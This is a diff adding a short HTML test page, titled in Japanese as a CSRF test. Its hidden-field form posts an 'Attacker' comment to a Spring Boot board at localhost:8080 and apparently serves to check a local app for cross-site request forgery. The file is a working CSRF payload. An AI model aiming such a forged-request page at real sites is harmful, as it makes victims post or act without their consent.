@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>csrf用テストHTML</title>
+  </head>
+  <body>
+    <form method="post" action="http://localhost:8080/board">
+      <input type="hidden" name="name" value="Attacker" />
+      <input type="hidden" name="mailAddress" value="example1@example.com" />
+      <input type="hidden" name="comment" value="CSRF攻撃による投稿" />
+      <button>CSRFによる不正投稿Springboot用</button>
+    </form>
+  </body>
+</html>
